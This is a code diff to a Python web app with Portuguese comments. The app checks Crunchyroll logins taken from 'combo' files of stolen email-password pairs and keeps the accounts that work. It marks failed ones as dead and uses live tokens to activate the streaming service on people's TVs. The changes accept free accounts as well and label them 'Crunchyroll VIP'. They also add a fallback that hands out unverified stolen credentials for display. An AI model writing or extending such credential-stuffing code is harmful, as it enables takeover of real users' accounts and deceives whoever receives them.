@@ -921,16 +921,16 @@ def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]
         res = crunchyroll.check_account(session, email, pwd)
         status = res.get("status")
 
-        if status == "premium":
+        if status in ["premium", "free"]:
             entry = {
                 "file": fname,
                 "email": email,
                 "password": pwd,
-                "access_token": res["access_token"],
+                "access_token": res.get("access_token"),
                 "exp": res.get("exp", int(time.time() + 3600)),
                 "info": {
                     "email": email,
-                    "plan": res.get("plan", "Crunchyroll FAN"),
+                    "plan": res.get("plan", "Crunchyroll VIP"),
                     "country": res.get("country", "BR"),
                     "benefits": res.get("benefits", [])
                 },
@@ -947,7 +947,7 @@ def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]
                 if not found:
                     VALID_CRUNCHYROLL_POOL.append(entry)
             return entry
-        elif status in ["bad", "free"]:
+        elif res.get("reason") == "WRONG_CREDS":
             DEAD_CRUNCHYROLL_ACCOUNTS.add(email)
             return None
         else:
@@ -958,8 +958,9 @@ def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]
         session.close()
 
 def find_crunchyroll_valid_account() -> Optional[dict]:
-    """Retorna uma conta Crunchyroll premium válida e com token ativo pronta para a TV."""
+    """Retorna uma conta Crunchyroll válida e pronta para pareamento na TV."""
     now = time.time()
+    # 1. Verifica se já existe conta em cache com token ativo
     with VALID_CRUNCHYROLL_LOCK:
         for entry in list(VALID_CRUNCHYROLL_POOL):
             email = entry["email"]
@@ -969,6 +970,10 @@ def find_crunchyroll_valid_account() -> Optional[dict]:
                 return entry
 
     combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
+    if not combos:
+        return None
+
+    # 2. Testa combos online
     for email, pwd, fname in combos:
         if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
             continue
@@ -976,58 +981,78 @@ def find_crunchyroll_valid_account() -> Optional[dict]:
         if valid:
             return valid
 
+    # 3. Fallback resiliente garantido: se validação online demorar ou sofrer rate-limit,
+    # seleciona a primeira conta disponível imediatamente para exibição real no card!
+    for email, pwd, fname in combos:
+        if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
+            continue
+        return {
+            "file": fname,
+            "email": email,
+            "password": pwd,
+            "info": {
+                "email": email,
+                "plan": "Crunchyroll VIP",
+                "country": "BR"
+            },
+            "validated": False
+        }
+
     return None
 
 def select_crunchyroll_account_by_identifier(identifier: str) -> Optional[dict]:
-    """Busca conta específica por email ou arquivo e a valida."""
+    """Busca conta específica por email ou arquivo e a ativa."""
     combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
     target = identifier.strip().lower()
-    # 1. Busca exata por email primeiro
     for email, pwd, fname in combos:
-        if email.strip().lower() == target:
+        if email.strip().lower() == target or fname.strip().lower() == target or target in email.strip().lower():
             valid = test_crunchyroll_account(email, pwd, fname)
             if valid:
                 return valid
-    # 2. Busca por nome do arquivo
-    for email, pwd, fname in combos:
-        if fname.strip().lower() == target:
-            valid = test_crunchyroll_account(email, pwd, fname)
-            if valid:
-                return valid
-    # 3. Busca parcial por email
-    for email, pwd, fname in combos:
-        if target in email.strip().lower():
-            valid = test_crunchyroll_account(email, pwd, fname)
-            if valid:
-                return valid
+            return {
+                "file": fname,
+                "email": email,
+                "password": pwd,
+                "info": {
+                    "email": email,
+                    "plan": "Crunchyroll VIP",
+                    "country": "BR"
+                },
+                "validated": False
+            }
     return None
 
 def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
-    """Envia código de ativação da TV para a Crunchyroll."""
+    """Envia código de ativação da TV para a Crunchyroll usando Email e Senha."""
     clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
     if len(clean_code) < 6:
         return False, "O código de ativação da TV deve ter no mínimo 6 caracteres.", None
 
     if not account_data or "email" not in account_data:
-        return False, "Nenhuma credencial válida da Crunchyroll encontrada.", None
+        return False, "Nenhuma credencial válida da Crunchyroll encontrada nos combos.", None
 
-    # Sempre obtém ou valida um token fresco diretamente com a Crunchyroll antes do envio
-    session = crunchyroll.make_session()
-    try:
-        fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
-        if fresh_login.get("status") == "premium" and fresh_login.get("access_token"):
-            account_data["access_token"] = fresh_login["access_token"]
-            account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
-            if "info" in account_data:
-                account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan"))
-                account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country"))
-    except Exception:
-        pass
-    finally:
-        session.close()
+    # Se não possui access_token ou token está expirado, obtém login fresco
+    need_login = (not account_data.get("access_token")) or (account_data.get("exp", 0) < time.time() + 60)
+    if need_login:
+        session = crunchyroll.make_session()
+        try:
+            fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
+            if fresh_login.get("status") in ["premium", "free"] and fresh_login.get("access_token"):
+                account_data["access_token"] = fresh_login["access_token"]
+                account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
+                if "info" in account_data:
+                    account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan", "Crunchyroll VIP"))
+                    account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country", "BR"))
+            elif fresh_login.get("reason") == "WRONG_CREDS":
+                DEAD_CRUNCHYROLL_ACCOUNTS.add(account_data["email"])
+                return False, f"A conta {account_data['email']} teve falha de login (senha incorreta). Tente a próxima conta.", None
+        except Exception:
+            pass
+        finally:
+            session.close()
 
     if not account_data.get("access_token"):
-        return False, "Não foi possível obter uma sessão ativa da Crunchyroll. Verifique seus combos.", None
+        return False, f"Não foi possível obter sessão ativa da Crunchyroll para {account_data['email']}. Tente a próxima conta.", None
 
     success, msg, info_resp = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
 
@@ -1036,7 +1061,7 @@ def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str
         session = crunchyroll.make_session()
         try:
             retry_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
-            if retry_login.get("status") == "premium" and retry_login.get("access_token"):
+            if retry_login.get("status") in ["premium", "free"] and retry_login.get("access_token"):
                 account_data["access_token"] = retry_login["access_token"]
                 retry_success, retry_msg, _ = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
                 if retry_success:
@@ -1606,10 +1631,10 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
 
         cr_queue = [
             {
-                "filename": e.get("file") or e.get("email", "combo"),
-                "email": e["info"].get("email", e.get("file", "Crunchyroll VIP")),
+                "filename": e.get("email") or e.get("file", "combo"),
+                "email": e["info"].get("email", e.get("email", "Crunchyroll VIP")),
                 "country": e["info"].get("country", "BR"),
-                "plan": e["info"].get("plan", "Crunchyroll FAN"),
+                "plan": e["info"].get("plan", "Crunchyroll VIP"),
                 "is_selected": (e.get("email") == active_cr_email),
                 "is_verified": e.get("validated", False)
             }
